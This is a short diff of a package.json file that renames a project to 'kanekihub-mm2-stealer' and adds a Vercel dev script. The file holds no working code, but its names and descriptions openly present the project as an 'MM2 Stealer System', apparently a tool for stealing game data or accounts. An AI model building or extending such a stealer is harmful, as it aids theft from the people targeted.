@@ -1,5 +1,11 @@
 {
-  "name": "zyrnox-ultimate",
-  "version": "5.0.0",
-  "description": "Zyrnox Ultimate MM2 Stealer System"
+  "name": "kanekihub-mm2-stealer",
+  "version": "1.0.0",
+  "description": "Advanced MM2 data extraction system",
+  "scripts": {
+    "dev": "vercel dev",
+    "build": "echo 'No build required'"
+  },
+  "dependencies": {},
+  "devDependencies": {}
 }
